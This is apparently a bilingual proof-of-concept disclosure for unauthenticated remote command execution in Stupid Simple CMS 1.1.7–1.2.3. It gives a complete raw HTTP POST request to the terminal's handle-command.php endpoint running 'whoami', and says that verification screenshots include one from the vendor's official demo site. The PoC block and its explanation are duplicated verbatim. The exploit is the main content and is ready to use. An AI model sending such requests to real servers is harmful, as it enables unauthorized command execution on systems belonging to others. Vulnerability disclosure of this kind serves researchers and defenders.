# POC
product： Stupid Simple CMS ( Blogger )
version：Version 1.1.7 - Version 1.2.3
## POC:
```shell
POST http://localhost/terminal/handle-command.php HTTP/1.1
Host: localhost
Content-Length: 14
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/terminal/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

command=whoami
```
## Vulnerability principle（漏洞原理）:  
The code audit found that there was no authentication operation in the execution command interface. Can result in unauthorized rce.  
So you only need to send a POST request to handle-command.php to RCE.
代审发现执行命令界面未进行鉴权操作。
product： Stupid Simple CMS ( Blogger )
version：Version 1.1.7 - Version 1.2.3
## POC:
```shell
POST http://localhost/terminal/handle-command.php HTTP/1.1
Host: localhost
Content-Length: 14
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/terminal/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

command=whoami
```
## Vulnerability principle（漏洞原理）:  
The code audit found that there was no authentication operation in the execution command interface. Can result in unauthorized rce.  
So you only need to send a POST request to handle-command.php to RCE.
代审发现执行命令界面未进行鉴权操作。
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312091131679.png)
## Vulnerability verification（漏洞验证）：
Local authentication（本地验证）：
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312091131290.png)
Official website demonstration address verification（demo验证）：
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312091131024.png)
